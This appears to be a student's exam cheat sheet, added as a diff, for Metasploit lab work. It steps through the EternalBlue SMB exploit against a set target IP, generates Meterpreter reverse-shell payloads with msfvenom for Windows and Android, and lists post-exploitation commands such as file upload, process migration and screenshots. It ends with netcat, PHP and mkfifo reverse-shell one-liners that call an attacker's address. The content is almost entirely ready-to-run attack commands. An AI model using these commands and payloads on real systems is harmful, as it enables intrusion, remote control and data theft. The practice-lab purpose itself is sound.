@@ -1,0 +1,377 @@
+Q1. Start Metasploit Framework
+
+msfconsole
+
+Q2. Search for an Exploit
+
+search ftp
+
+search smb
+
+search ssh
+
+search http
+
+Q3. Display Exploit Information
+
+info exploit/windows/smb/ms17_010_eternalblue
+
+Q4. Load an Exploit Module
+
+use exploit/windows/smb/ms17_010_eternalblue
+
+Q5. Display Exploit Options
+
+show options
+
+Q6. Set Target IP (RHOSTS)
+
+set RHOSTS 192.168.80.138
+
+Q7. Set Payload
+
+show payloads
+
+set payload windows/x64/meterpreter/reverse_tcp
+
+Q8. Set Local IP (LHOST)
+
+set LHOST 192.168.80.136
+
+(Optional)
+set LPORT 4444
+
+Q9. Run the Exploit
+
+exploit
+
+OR
+
+run
+
+Q10. List Active Sessions
+
+sessions
+
+Q11. Interact with Meterpreter Session
+
+sessions -i 1
+
+Q12. Execute System Commands
+
+getuid
+
+sysinfo
+
+shell
+
+whoami
+
+hostname
+
+ipconfig
+
+exit
+
+Q13. Upload / Download File
+
+upload file.txt C:\\Users\\Public\\
+
+download C:\\Users\\Public\\file.txt
+
+Q14. Background Meterpreter Session
+
+background
+
+Q15. Exit Meterpreter
+
+exit
+
+Terminate all sessions
+
+sessions -K
+
+Exit Metasploit
+
+exit
+
+Scanner-Based Questions
+
+Scan SMB
+
+use auxiliary/scanner/smb/smb_version
+
+set RHOSTS 192.168.80.138
+
+run
+
+Scan FTP
+
+use auxiliary/scanner/ftp/ftp_version
+
+set RHOSTS 192.168.80.138
+
+run
+
+Scan SSH
+
+use auxiliary/scanner/ssh/ssh_version
+
+set RHOSTS 192.168.80.138
+
+run
+
+Check SMB Vulnerability
+
+use auxiliary/scanner/smb/smb_ms17_010
+
+set RHOSTS 192.168.80.138
+
+run
+
+Port Scan
+
+use auxiliary/scanner/portscan/tcp
+
+set RHOSTS 192.168.80.138
+
+run
+
+Payload Questions
+
+Generate Windows Payload
+
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.80.136 LPORT=4444 -f exe -o shell.exe
+
+Generate Android Payload
+
+msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.80.136 LPORT=4444 -o android.apk
+
+Start Multi Handler
+
+use exploit/multi/handler
+
+set payload windows/x64/meterpreter/reverse_tcp
+
+set LHOST 192.168.80.136
+
+set LPORT 4444
+
+run
+
+Receive Reverse Connection
+
+Wait for incoming Meterpreter session
+
+Meterpreter Commands
+
+help
+
+sysinfo
+
+getuid
+
+pwd
+
+ls
+
+cd Desktop
+
+cat file.txt
+
+search -f *.txt
+
+screenshot
+
+download file.txt
+
+upload file.txt
+
+ps
+
+migrate <PID>
+
+background
+
+shell
+
+exit
+
+Common Search Commands
+
+search type:exploit smb
+
+search type:auxiliary ftp
+
+search platform:windows smb
+
+search eternalblue
+
+Common Show Commands
+
+show exploits
+
+show payloads
+
+show auxiliary
+
+show options
+
+show advanced
+
+show targets
+
+Common Session Commands
+
+sessions
+
+sessions -i 1
+
+sessions -l
+
+sessions -K
+
+Exam Workflow
+
+msfconsole
+
+search smb
+
+use exploit/windows/smb/ms17_010_eternalblue
+
+show options
+
+set RHOSTS 192.168.80.138
+
+set payload windows/x64/meterpreter/reverse_tcp
+
+set LHOST 192.168.80.136
+
+exploit
+
+sessions
+
+sessions -i 1
+
+sysinfo
+
+getuid
+
+pwd
+
+ls
+
+shell
+
+whoami
+
+hostname
+
+ipconfig
+
+exit
+
+background
+
+sessions -K
+
+exit
+
+
+
+
+--------------
+
+WEBSER - PHP
+
+1. Start Metasploit
+
+msfconsole
+
+2. Search appropriate exploit
+
+search <service_name>
+
+3. Load exploit
+
+use <exploit_module>
+
+4. Show exploit options
+
+show options
+
+5. Set target
+
+set RHOSTS <target_ip>
+
+6. Select payload
+
+show payloads
+set payload <appropriate_payload>
+
+7. Set local callback information (if required)
+
+set LHOST <your_ip>
+set LPORT 4444
+
+8. Run the module
+
+run
+
+OR
+
+exploit
+
+9. If a session is opened
+
+sessions
+
+10. Interact with the session
+
+sessions -i 1
+
+11. Verify access
+
+sysinfo
+getuid
+pwd
+ls
+
+12. Basic file operations
+
+upload <local_file> <destination>
+download <remote_file>
+
+13. Navigate directories
+
+cd <directory>
+pwd
+ls
+
+14. Background session
+
+background
+
+15. Close session
+
+exit
+
+16. Kill all sessions
+
+sessions -K
+
+17. Exit Metasploit
+
+exit
+
+
+## revers shell 
+
+attacker - nc -lvnp 4444
+target - nc <ATTACKER_IP> 4444 -c /bin/bash
+
+php - php -r '$sock=fsockopen("10.10.17.1",1337); exec("/bin/sh -i <&3 >&3 2>&3");'
+
+netcat-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.17.1 1337 >/tmp/f
+
+
